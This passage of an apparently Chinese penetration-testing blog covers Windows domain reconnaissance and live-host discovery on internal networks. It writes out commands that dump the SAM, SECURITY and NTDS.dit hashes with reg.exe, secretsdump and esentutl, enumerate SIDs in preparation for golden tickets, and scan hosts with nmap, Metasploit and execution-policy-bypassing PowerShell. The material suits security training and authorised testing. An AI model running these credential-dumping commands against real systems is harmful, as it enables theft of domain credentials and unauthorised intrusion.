https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">199012</span></code></pre><h3 id="3-4-域环境信息搜集"><a href="#3-4-域环境信息搜集" class="headerlink" title="3.4 域环境信息搜集"></a>3.4 域环境信息搜集</h3><h4 id="3-4-1、Active-Directory-Domain-Services-获取域控信息"><a href="#3-4-1、Active-Directory-Domain-Services-获取域控信息" class="headerlink" title="3.4.1、Active Directory Domain Services - 获取域控信息"></a>3.4.1、Active Directory Domain Services - 获取域控信息</h4><p>参考文章：<code>https://payloads.online/archivers/2019-04-12/1</code> 感谢倾旋</p><hr><h4 id="3-4-2、Windows域渗透-用户密码枚举"><a href="#3-4-2、Windows域渗透-用户密码枚举" class="headerlink" title="3.4.2、Windows域渗透-用户密码枚举"></a>3.4.2、Windows域渗透-用户密码枚举</h4><p>参考文章：<code>https://payloads.online/archivers/2018-05-02/1</code> 感谢倾旋</p><hr><h4 id="3-4-3、不同环境下域dns记录信息收集方法"><a href="#3-4-3、不同环境下域dns记录信息收集方法" class="headerlink" title="3.4.3、不同环境下域dns记录信息收集方法"></a>3.4.3、不同环境下域dns记录信息收集方法</h4><p>书上介绍了DNS信息查询方法：</p><pre><code class="hljs nginx"><span class="hljs-attribute">DNS</span> Manager
Dnscmd
使用 Powershell进行dns信息查询
adidnsdump
SharpAdidnsdump</code></pre><p>五种方法来获取不通环境下域dns信息，这里后期科补~~~</p><hr><h4 id="3-4-4、impacket框架之域信息获取"><a href="#3-4-4、impacket框架之域信息获取" class="headerlink" title="3.4.4、impacket框架之域信息获取"></a>3.4.4、impacket框架之域信息获取</h4><p>本篇文章讲述impacket套件内部分常用域、内网信息收集工具使用，将会用到的工具，secretsdump、lookupsid、 esentutl、ticketer</p><h5 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h5><p>Secretsdump常用于本地、远程hash导出，具体使用方法如下：</p><p>在渗透测试工作中，为了躲避杀软等防护产品，dump目标机hash通常会进行以下操作。</p><pre><code class="hljs livescript">C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\sam</span> c:<span class="hljs-string">\sam.save</span>
C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\security</span> c:<span class="hljs-string">\security.save</span> 
C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\system</span> c:<span class="hljs-string">\system.save</span></code></pre><p>以上三个注册表项解释:</p><pre><code class="hljs pgsql">SAM存储域用户或本地用户的数据，包括域用户组名或本机用户组、用户名及密码哈希等。
<span class="hljs-keyword">Security</span>存储用户安全策略，存储域用户、本地用户登陆记录，缓存的登陆用户凭证，例如<span class="hljs-keyword">domain</span> <span class="hljs-keyword">cache</span>
system用来解密SAM和Security</code></pre><p>之后使用secretsdump进行hash内容导出，具体方法如下:</p><p><strong>1）本地hash导出</strong></p><p>获取SAM中hash</p><pre><code class="hljs maxima">secretsdump.py -sam sam.<span class="hljs-built_in">save</span> -<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span> LOCAL</code></pre><p>获取security.save中缓存的登陆用户凭证和LSA Secres</p><pre><code class="hljs pgsql">secretsdump.py -<span class="hljs-keyword">security</span> <span class="hljs-keyword">security</span>.save -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span>.save <span class="hljs-keyword">LOCAL</span></code></pre><p>获取sam security 中所有内容</p><pre><code class="hljs maxima">secretsdump.py -sam sam.<span class="hljs-built_in">save</span> -security security.<span class="hljs-built_in">save</span> -<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span> LOCAL</code></pre><p><strong>2）域用户hash导出</strong></p><p>域用户hash导出还需要NTDS.dit活动目录数据库文件，具体导出方法请查看gitbook《转储域账 户哈希值》</p><p>使用以下命令导出域所有用户hash</p><pre><code class="hljs vim"><span class="hljs-keyword">python</span> secretsdump.<span class="hljs-keyword">py</span> -ntds NTDS.dit -<span class="hljs-built_in">system</span> SYSTEM LOCAL -outputfile
<span class="hljs-keyword">lol</span>.hash</code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">secretsdump</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-ntds</span> <span class="hljs-selector-tag">NTDS</span><span class="hljs-selector-class">.dit</span> <span class="hljs-selector-tag">-system</span> <span class="hljs-selector-tag">temp_sys</span><span class="hljs-selector-class">.hiv</span> <span class="hljs-selector-tag">LOCAL-outputfile</span> <span class="hljs-selector-tag">lol</span><span class="hljs-selector-class">.hash</span></code></pre><pre><code class="hljs llvm">proxychains python secretsdump.py rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span></code></pre><p><strong>3）远程导出hash</strong></p><p>secretsdump还支持远程导岀hash，支持socks代理传输数据，需提供远程服务器管理员账号凭证，支持两种方式读取活动目录数据库，Vssadmin和DRSUAPI(Directory Replication Service API)远程目录复制协议api</p><p>导出远程机hash及缓存记录</p><pre><code class="hljs llvm">secretsdump.exe rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span></code></pre><p>使用 Vssadmin复制用户数据库文件的方式进行远程hash导出</p><pre><code class="hljs llvm">secretsdump.exe rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> -just-dc -use-vss</code></pre><h5 id="Esentutl"><a href="#Esentutl" class="headerlink" title="Esentutl"></a>Esentutl</h5><p>esentutl常用于从dit文件提取域内信息的工具，具体使用命令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">esentutl</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">NTDS</span><span class="hljs-selector-class">.dit</span> <span class="hljs-selector-tag">export-table</span> <span class="hljs-selector-tag">datatable</span> &gt;<span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.txt</span></code></pre><h5 id="Ticket"><a href="#Ticket" class="headerlink" title="Ticket"></a>Ticket</h5><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://wh<span class="hljs-number">0</span>ale.github.io/<span class="hljs-number">2018</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-<span class="hljs-number">25</span>-域渗透之票据/</code></pre><h5 id="lookupsid-py"><a href="#lookupsid-py" class="headerlink" title="lookupsid.py"></a>lookupsid.py</h5><p>可查看远程目标机器或域控所有用户内容(需提供域任意用户凭证)</p><p>lookupsid在读取远程机器用户信息时，同时会输出域SID，域SID是生成黄金票据所需数据。</p><pre><code class="hljs css"><span class="hljs-selector-tag">lookupsid</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">domain</span>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:password</span><span class="hljs-keyword">@ip</span></code></pre><hr><h4 id="3-4-5、域信息收集之user2sid，sid2user"><a href="#3-4-5、域信息收集之user2sid，sid2user" class="headerlink" title="3.4.5、域信息收集之user2sid，sid2user"></a>3.4.5、域信息收集之user2sid，sid2user</h4><p>使用场景：当前内网环境有域环境，使用nbtscan或者nltest获取到域控的IP，但是没有域用户的账号密码</p><p>作用：使用 sid2user 和 user2sid 枚举猜测出域用户名，并通过弱口令获取域用户的权限<br>下载地址：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//g</span>reatagain.dbappsecurity.com.cn<span class="hljs-regexp">/#/</span>publicarea<span class="hljs-regexp">/tooldisk?path=412/</span><span class="hljs-number">2430</span></code></pre><p>目前无法访问！</p><p><strong>使用</strong></p><pre><code class="hljs armasm"><span class="hljs-symbol">user2sid.exe</span> \\域控<span class="hljs-built_in">IP</span> 域用户名</code></pre><p>域里面域管默认为administrator用户，且sid为500</p><p>那么先通过administrator域管获取域用户的sid</p><pre><code class="hljs css"><span class="hljs-selector-tag">user2sid</span><span class="hljs-selector-class">.exe</span> \\192.168<span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">administrator</span></code></pre><p>得到域用户的sd为S-1-5-21-675002476-827761xxxx…<br>总结文章：</p><pre><code class="hljs awk">freebuf.com<span class="hljs-regexp">/sectool/</span><span class="hljs-number">175208</span>.html</code></pre><hr><h2 id="4、工作组环境信息搜集"><a href="#4、工作组环境信息搜集" class="headerlink" title="4、工作组环境信息搜集"></a>4、工作组环境信息搜集</h2><h3 id="4-1-基于MSF发现内网存活主机"><a href="#4-1-基于MSF发现内网存活主机" class="headerlink" title="4.1 基于MSF发现内网存活主机"></a>4.1 基于MSF发现内网存活主机</h3><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep    <span class="hljs-comment">#基于arp协议发现内网存活主机，这不能通过代理使用</span>
auxiliary<span class="hljs-regexp">/scanner/</span>portscan/ack           <span class="hljs-comment">#基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描，默认扫描1-10000端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span>

auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version        <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version        <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version  <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp            <span class="hljs-comment">#发现dns服务，基于默认53端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version      <span class="hljs-comment">#发现内网http服务，基于默认80端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/title             <span class="hljs-comment">#探测内网http服务的标题</span>
auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version        <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span>
use auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump  <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span>
use auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump  <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span>
auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version    <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner        <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server     <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version        <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#探测内网主机的netbios名字</span></code></pre><p>感谢Micro8大佬！！！</p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">21</span>-<span class="hljs-number">30</span>/<span class="hljs-number">28</span>-ji-yu-msf-fa-xian-nei-wang-cun-huo-zhu-ji-di-liu-ji</code></pre><hr><h3 id="4-2、基于sqlDataSourceEnumerator发现内网存活主机"><a href="#4-2、基于sqlDataSourceEnumerator发现内网存活主机" class="headerlink" title="4.2、基于sqlDataSourceEnumerator发现内网存活主机"></a>4.2、基于sqlDataSourceEnumerator发现内网存活主机</h3><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">41</span>-<span class="hljs-number">50</span>/<span class="hljs-number">50</span>-ji-yu-sqldatasourceenumerator-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><p>感谢大佬！！Micro8</p><hr><h3 id="4-3、基于ICMP发现内网存活主机"><a href="#4-3、基于ICMP发现内网存活主机" class="headerlink" title="4.3、基于ICMP发现内网存活主机"></a>4.3、基于ICMP发现内网存活主机</h3><p><strong>ICMP简介：</strong></p><p>它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs bash">$ sudo nmap -sP -PI 192.168.1.0/24 -T4</code></pre><pre><code class="hljs bash">$ nmap -sn -PE -T4 192.168.1.0/24</code></pre><p><strong>CMD下扫描：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %%P in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) do @ping -w <span class="hljs-number">10</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.%%P | findstr TTL</code></pre><p><strong>powershell扫描：</strong></p><pre><code class="hljs 1c">powershell.exe ‐exec bypass ‐Command <span class="hljs-string">&quot;Import‐Module ./Invoke‐TSPingSweep.ps1</span>
; Invoke‐TSPingSweep ‐StartAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> ‐EndAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">1.254</span> ‐Resolv
eHost ‐ScanPort ‐Port <span class="hljs-number">445</span>,<span class="hljs-number">135</span><span class="hljs-string">&quot;</span></code></pre><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\&gt;tcping.exe ‐n <span class="hljs-number">1</span> <span class="hljs-number">192.168.1.0</span> <span class="hljs-number">80</span></code></pre><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">21</span>-<span class="hljs-number">30</span>/<span class="hljs-number">21</span>-ji-yu-icmp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-4、基于UDP发现内网存活主机"><a href="#4-4、基于UDP发现内网存活主机" class="headerlink" title="4.4、基于UDP发现内网存活主机"></a>4.4、基于UDP发现内网存活主机</h3><p><strong>UDP简介：</strong></p><p>UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p><p><strong>UDP显著特性：</strong></p><p>1）UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。</p><p>2）UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。</p><p>3）UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报</p><p>4）UDP 支持多播和广播。</p><p><strong>1、nmap扫描</strong></p><pre><code class="hljs gams"><span class="hljs-symbol">$</span> nmap -sU -T5 -sV --<span class="hljs-built_in">max</span>-retries <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> -p <span class="hljs-number">500</span></code></pre><p><strong>2、msf扫描</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe
msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep</code></pre><p><strong>3、unicornscan扫描</strong></p><p>linux下使用推荐</p><pre><code class="hljs dns">$ unicornscan -mU <span class="hljs-number">192.168.1.100</span></code></pre><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.mcafee.com<span class="hljs-regexp">/ca/</span>downloads<span class="hljs-regexp">/free-tools/</span>scanline.aspx</code></pre><p>蓝奏地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.lanzous.com/i32zncf</code></pre><p>win下使用推荐。管理员执行</p><p>附录：<br>在线基于Nmap的udp扫描：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pentest-tools.com<span class="hljs-regexp">/network-vulnerability-scanning/u</span>dp-port-scanner-online-nmap</code></pre><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">12</span>-ji-yu-udp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-5、基于ARP发现内网存活主机"><a href="#4-5、基于ARP发现内网存活主机" class="headerlink" title="4.5、基于ARP发现内网存活主机"></a>4.5、基于ARP发现内网存活主机</h3><p><strong>ARP简介：</strong></p><p>ARP，通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p><p><strong>1、nmap扫描</strong></p><pre><code class="hljs vim">$ <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> -PR <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">24</span></code></pre><p><strong>2、msf扫描</strong></p><pre><code class="hljs pgsql">msf &gt; use auxiliary/scanner/discovery/arp_sweep
msf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span>

Module <span class="hljs-keyword">options</span> (auxiliary/scanner/discovery/arp_sweep):

<span class="hljs-type">Name</span> <span class="hljs-keyword">Current</span> Setting Required Description
<span class="hljs-comment">---- --------------- -------- -----------</span>
INTERFACE <span class="hljs-keyword">no</span> The <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the interface
RHOSTS yes The target address range <span class="hljs-keyword">or</span> <span class="hljs-type">CIDR</span> identifier
SHOST <span class="hljs-keyword">no</span> Source IP Address
SMAC <span class="hljs-keyword">no</span> Source MAC Address
THREADS <span class="hljs-number">1</span> yes The number <span class="hljs-keyword">of</span> concurrent threads
TIMEOUT <span class="hljs-number">5</span> yes The number <span class="hljs-keyword">of</span> seconds <span class="hljs-keyword">to</span> wait <span class="hljs-keyword">for</span> <span class="hljs-built_in">new</span> data

msf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>
RHOSTS =&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>
msf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">set</span> THREADS <span class="hljs-number">10</span></code></pre><p><strong>3、netdiscover</strong></p><pre><code class="hljs dns">$ netdiscover -r <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> -i wlan0</code></pre><p><strong>4、arp-scan（linux）</strong><br>(推荐)速度与快捷 项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>linux.die.net<span class="hljs-regexp">/man/</span><span class="hljs-number">1</span>/arp-scan</code></pre><p>arp-scan没有内置kali，需要下载安装</p><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install arp-<span class="hljs-built_in">scan</span></code></pre><p><strong>5、Powershell</strong></p><pre><code class="hljs avrasm"><span class="hljs-symbol">c:</span>\tmp&gt;powershell.exe -exec bypass -Command <span class="hljs-string">&quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;</span></code></pre><p><strong>6、arp scannet</strong><br>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sourceforge.net<span class="hljs-regexp">/projects/</span>arpscannet<span class="hljs-regexp">/files/</span>arpscannet<span class="hljs-regexp">/arpscannet 0.4/</span></code></pre><p><strong>7、arp-scan（windows）</strong></p><p>(推荐)速度与快捷</p><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>-scan.exe -t <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span></code></pre><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/QbsuranAlang/</span>arp-scan-windows-<span class="hljs-regexp">/tree/m</span>aster/arp-scan （非官方）</code></pre><p><strong>8、arp-ping.exe</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>-ping.exe <span class="hljs-number">192.168.1.100</span></code></pre><p><strong>9、其他</strong></p><p>如cain的arp发现，一些开源py，pl脚本等，不一一介绍。</p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">13</span>-ji-yu-arp-fa-xian-nei-wang-cun-huo-zhu-ji#<span class="hljs-number">5</span>-powershell</code></pre><hr><h3 id="4-6、基于snmp发现内网存活主机"><a href="#4-6、基于snmp发现内网存活主机" class="headerlink" title="4.6、基于snmp发现内网存活主机"></a>4.6、基于snmp发现内网存活主机</h3><p><strong>SNMP简介：</strong></p><p>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs ada">$ nmap -sU <span class="hljs-comment">--script snmp-brute 192.168.1.0/24 -T4</span></code></pre><p><strong>msf扫描：</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/snmp_enum</code></pre><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.mcafee.com<span class="hljs-regexp">/us/</span>downloads<span class="hljs-regexp">/free-tools/</span>snscan.aspx</code></pre><p>依然是一块macafee出品的攻击</p><p><strong>NetCrunch：</strong></p><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.adremsoft.com<span class="hljs-regexp">/demo/</span></code></pre><p>内网安全审计工具，包含了DNS审计，ping扫描，端口，网络服务等<br><strong>snmp for pl扫描：</strong></p><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/dheiland-r7/</span>snmp</code></pre><p><strong>附录：</strong></p><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/aix_version use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enum
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/arris_dg950
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/snmp_enum_hp_laserjet
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/brocade_enumhash use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enumshares 
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cambium_snmp_loot use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enumusers
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cisco_config_tftp use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_login
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cisco_upload_file use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_set
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/netopia_enum
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/ubee_ddw3611 
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/sbg6580_enum
use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/xerox_workcentre_enumusers</code></pre><p><strong>其他内网安全审计工具（snmp）：</strong><br>项目地址：<a target="_blank" rel="noopener" href="https://www.solarwinds.com/topics/snmp-scanner">https://www.solarwinds.com/topics/snmp-scanner</a><br>项目地址：<a target="_blank" rel="noopener" href="https://www.netscantools.com/nstpro_snmp.html">https://www.netscantools.com/nstpro_snmp.html</a></p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">20</span>-ji-yu-snmp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-7、基于netbios发现內网存活主机"><a href="#4-7、基于netbios发现內网存活主机" class="headerlink" title="4.7、基于netbios发现內网存活主机"></a>4.7、基于netbios发现內网存活主机</h3><p><strong>netbios简介：</strong></p><p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。</p><p>系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs ada">$ nmap -sU <span class="hljs-comment">--script nbstat.nse -p137 192.168.1.0/24 -T4</span></code></pre><p><strong>msf扫描：</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname</code></pre><p><strong>nbtscan扫描：</strong></p><p>项目地址：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.unixwiz.net<span class="hljs-regexp">/tools/</span>nbtscan.html</code></pre><p><strong>Windows:</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\&gt;nbtscan-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">35</span>.exe -m <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span></code></pre><p><strong>Linux：（推荐）</strong></p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>tar -zxvf ./nbtscan-source<span class="hljs-number">-1.0</span>.<span class="hljs-number">35</span>.tgz（<span class="hljs-number">1.5</span>.<span class="hljs-number">1</span>版本在附录）
<span class="hljs-variable">$ </span>make 
<span class="hljs-variable">$ </span>nbtscan -r <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span></code></pre><pre><code class="hljs dns">$ nbtscan -v -s: <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span></code></pre><p><strong>NetBScanner：</strong></p><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.nirsoft.net<span class="hljs-regexp">/utils/</span>netbios_scanner.html</code></pre><p>附录：<br><strong>nbtscan：</strong></p><pre><code class="hljs sql">NBTscan version 1.5.1. Copyright (C) 1999-2003 Alla Bezroutchko. This is a free software and it comes <span class="hljs-keyword">with</span> absolutely <span class="hljs-keyword">no</span> warranty. You can <span class="hljs-keyword">use</span>,<span class="hljs-keyword">distribute</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">modify</span> it <span class="hljs-keyword">under</span> terms <span class="hljs-keyword">of</span> GNU GPL.

<span class="hljs-keyword">Usage</span>:
nbtscan [-v] [-d] [-e] [-l] [-t <span class="hljs-keyword">timeout</span>] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;)
    -v verbose output. Print <span class="hljs-keyword">all</span> <span class="hljs-keyword">names</span> receivedfrom <span class="hljs-keyword">each</span> host
    -d dump packets. Print whole packet contents.
    -e <span class="hljs-keyword">Format</span> <span class="hljs-keyword">output</span> <span class="hljs-keyword">in</span> /etc/<span class="hljs-keyword">hosts</span> format.
    -l <span class="hljs-keyword">Format</span> <span class="hljs-keyword">output</span> <span class="hljs-keyword">in</span> lmhosts format.Cannot be used <span class="hljs-keyword">with</span> -v, -s <span class="hljs-keyword">or</span> -h options.
    -t <span class="hljs-keyword">timeout</span> <span class="hljs-keyword">wait</span> <span class="hljs-keyword">timeout</span> milliseconds <span class="hljs-keyword">for</span> response.Default <span class="hljs-number">1000.</span>
    -b bandwidth <span class="hljs-keyword">Output</span> throttling. Slow down <span class="hljs-keyword">output</span> so that it uses <span class="hljs-keyword">no</span> more that bandwidth bps. Useful <span class="hljs-keyword">on</span> slow links, so that ougoing queries don<span class="hljs-string">&#x27;t get dropped.</span>
